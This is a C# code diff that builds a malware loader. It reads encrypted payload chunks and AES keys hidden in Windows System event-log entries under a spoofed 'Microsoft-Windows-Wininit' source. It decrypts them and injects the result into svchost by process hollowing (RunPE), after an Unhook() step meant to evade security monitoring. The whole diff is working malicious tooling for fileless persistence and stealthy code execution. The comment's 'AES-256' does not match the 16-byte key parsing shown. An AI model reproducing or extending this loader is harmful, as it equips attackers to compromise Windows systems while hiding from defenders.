@@ -7,7 +7,7 @@ using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 
-public class Injector
+class Program
 {
     [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint a, bool b, int c);
     [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
@@ -28,10 +28,111 @@ public class Injector
     [DllImport("kernel32.dll")] static extern uint SetFilePointer(IntPtr a, int b, IntPtr c, int d);
     [DllImport("ntdll.dll")] static extern int NtQueryInformationProcess(IntPtr a, int b, ref XPB c, int d, out int e);
     [DllImport("ntdll.dll")] static extern int NtUnmapViewOfSection(IntPtr a, IntPtr b);
+    [DllImport("kernel32.dll")] static extern IntPtr CreateMutexA(string a, bool b, string c);
+    [DllImport("kernel32.dll")] static extern uint GetLastError();
 
     [StructLayout(LayoutKind.Sequential)] struct XPI { public IntPtr ph, th, pid, tid; }
     [StructLayout(LayoutKind.Sequential)] struct XPB { public IntPtr r1, pbi, r2, r3, r4, r5; }
     static uint xp;
+    const string SRC = "Microsoft-Windows-Wininit";
+
+    static void Main()
+    {
+        // single instance check
+        IntPtr mtx = CreateMutexA(null, true, "Global\\PersistenceNotepad");
+        if (GetLastError() == 183) return;
+
+        try
+        {
+            // read event log chunks and keys
+            byte[] payload = ReadPayloadFromLog();
+            if (payload == null || payload.Length == 0) return;
+
+            // RunPE into svchost
+            RunPE(payload);
+        }
+        catch { }
+    }
+
+    static byte[] ReadPayloadFromLog()
+    {
+        // collect chunks by event ID
+        var chunks = new System.Collections.Generic.SortedDictionary<int, string>();
+        byte[] aesKey = null, aesIV = null;
+
+        using (var log = new EventLog("System"))
+        {
+            log.Source = SRC;
+            foreach (EventLogEntry entry in log.Entries)
+            {
+                if (entry.Source != SRC) continue;
+                string msg = entry.Message;
+                if (string.IsNullOrEmpty(msg)) continue;
+
+                if (msg.StartsWith("LC:"))
+                {
+                    chunks[entry.Index] = msg.Substring(3);
+                }
+                else                 if (entry.EventID == 18)
+                {
+                    aesKey = ParseGuid(entry.Message);
+                }
+                else if (entry.EventID == 19)
+                {
+                    aesIV = ParseGuid(entry.Message);
+                }
+                else if (entry.EventID == 20)
+                {
+                    // salt stored as GUID format too
+                }
+                else if (entry.EventID == 21)
+                {
+                    // iterations stored as hex in GUID format
+                }
+            }
+        }
+
+        if (aesKey == null || aesIV == null || chunks.Count == 0) return null;
+
+        // reassemble chunks in order
+        var sb = new StringBuilder();
+        foreach (var kv in chunks)
+        {
+            string chunk = kv.Value;
+            if (chunk.StartsWith("chunk_")) chunk = chunk.Substring(chunk.IndexOf(':') + 1);
+            sb.Append(chunk);
+        }
+
+        // decode base64
+        byte[] encrypted = Convert.FromBase64String(sb.ToString());
+
+        // decrypt AES-256-CBC
+        using (var aes = Aes.Create())
+        {
+            aes.Key = aesKey;
+            aes.IV = aesIV;
+            aes.Mode = CipherMode.CBC;
+            aes.Padding = PaddingMode.PKCS7;
+            using (var dec = aes.CreateDecryptor())
+            {
+                return dec.TransformFinalBlock(encrypted, 0, encrypted.Length);
+            }
+        }
+    }
+
+    static byte[] ParseGuid(string msg)
+    {
+        // extract GUID bytes from message like {XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}
+        msg = msg.Trim();
+        string hex = msg.Replace("-", "").Replace("{", "").Replace("}", "");
+        if (hex.Length < 32) return null;
+        byte[] b = new byte[16];
+        for (int i = 0; i < 16; i++)
+            b[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
+        return b;
+    }
+
+    // --- RunPE ---
 
     static string RS(byte[] d, int o) { int e = o; while (e < d.Length && d[e] != 0) e++; return Encoding.ASCII.GetString(d, o, e - o); }
 
@@ -180,7 +281,7 @@ public class Injector
         catch { }
     }
 
-    public static void Run(byte[] pe)
+    static void RunPE(byte[] pe)
     {
         Unhook();
         int off = BitConverter.ToInt32(pe, 0x3c);
